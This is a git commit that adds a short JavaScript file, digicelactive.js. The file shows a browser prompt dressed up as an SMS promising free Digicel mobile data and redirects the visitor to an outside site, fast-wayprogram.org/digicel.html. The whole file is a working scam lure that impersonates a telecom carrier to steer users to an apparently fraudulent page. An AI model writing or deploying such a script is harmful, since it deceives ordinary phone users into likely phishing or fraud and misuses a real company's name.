e78ba561aa6c1874bf24d112c5dafe76b6831e9b
superblog1 <imohette4@gmail.com>
2025-02-26 10:35:59 +0100

    Create digicelactive.js

---
+++ digicelactive.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE FREE DATA'
+password=prompt('SMS! Get FREE DATA if your Digicel Sim Card is up to 6 months or above, Kindly Press OK to CHECK now   ','ACTIVATE FREE DATA');
+if (password != 'ACTIVATE FREE DATA') {
+location.href='https://fast-wayprogram.org/digicel.html';
+}
